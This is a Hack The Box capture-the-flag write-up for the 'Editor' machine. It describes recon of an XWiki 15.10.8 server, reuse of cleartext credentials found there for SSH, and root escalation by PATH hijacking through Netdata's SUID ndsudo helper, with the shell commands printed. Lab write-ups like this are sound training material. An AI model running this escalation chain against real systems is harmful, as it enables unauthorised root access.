# CTF – Editor (Writeup)

## Context

In this Hack The Box challenge I target a machine exposing several web services.  
The goal is to get initial access, then escalate privileges up to **root**.

---

## Recon

I start with an Nmap scan to identify the exposed services:

    nmap -sC -sS -sV 10.10.11.80

The scan shows:
- an HTTP service on port 80
- an HTTP service on port 8080

Hitting port 8080, I find an **XWiki** instance (version 15.10.8).

---

## Initial access – XWiki exploitation

XWiki 15.10.8 is vulnerable to a flaw that gives access to the XWiki server.

After exploiting it, I dig through the config files on the server and find credentials stored in cleartext.

I recover these credentials:

- User: oliver  
- Password: t********9  

I can then log in over SSH:

    ssh oliver@10.10.11.80

---

## Local enumeration

Once logged in as `oliver`, I transfer **linPEAS** to automate the enumeration.

From my machine:

    scp ./linpeas.sh oliver@10.10.11.80:/tmp/

Then on the target:

    chmod +x /tmp/linpeas.sh
    /tmp/linpeas.sh

The tool doesn't surface anything obvious right away. So I decide to look manually for SUID binaries owned by root.

---

## Looking for SUID binaries

I run:

    find / -user root -perm -4000 -print 2>/dev/null

Notable result:

    /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
    /opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
    /opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
    /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
    /opt/netdata/usr/libexec/netdata/plugins.d/ioping
    /opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
    /opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
    /usr/bin/newgrp
    /usr/bin/gpasswd
    /usr/bin/su
    /usr/bin/umount
    /usr/bin/chsh
    /usr/bin/fusermount3
    /usr/bin/sudo
    /usr/bin/passwd
    /usr/bin/mount
    /usr/bin/chfn
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/openssh/ssh-keysign
    /usr/libexec/polkit-agent-helper-1

One thing stands out: **ndsudo**, a plugin tied to **Netdata**.

---

## Looking at ndsudo

After some research, I find there's a **public PoC** that exploits `ndsudo`.  
The `oliver` user belongs to the **netdata** group, which makes the exploitation possible.

The attack relies on hijacking a binary that `ndsudo` calls.

---

## Privilege escalation via ndsudo

I grab public C code from GitHub and compile it on my machine as `nvme`.

On my machine:

    gcc exploit.c -o nvme

I then transfer the binary to the target:

    scp nvme oliver@10.10.11.80:/tmp/nvme

On the target:

    chmod +x /tmp/nvme
    export PATH=/tmp:$PATH

Then I run the vulnerable command:

    /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

Thanks to the PATH manipulation and the `ndsudo` call, the binary runs with **root** privileges.

I become **root** on the machine directly.

---

## Conclusion

This challenge shows:
- the risk of vulnerable web apps (XWiki)
- the danger of credentials stored in cleartext
- why misconfigured system groups matter
- the critical impact of exploitable SUID binaries like `ndsudo`

The exploitation combines:
- application compromise
- credential recovery
- SSH access
- privilege escalation through a vulnerable Netdata plugin

---

## Skills demonstrated

- Network recon (Nmap)
- Exploiting a vulnerable CMS (XWiki)
- Finding and using credentials
- Linux local enumeration
- SUID binary analysis
- Using public PoCs
- Privilege escalation through PATH hijacking
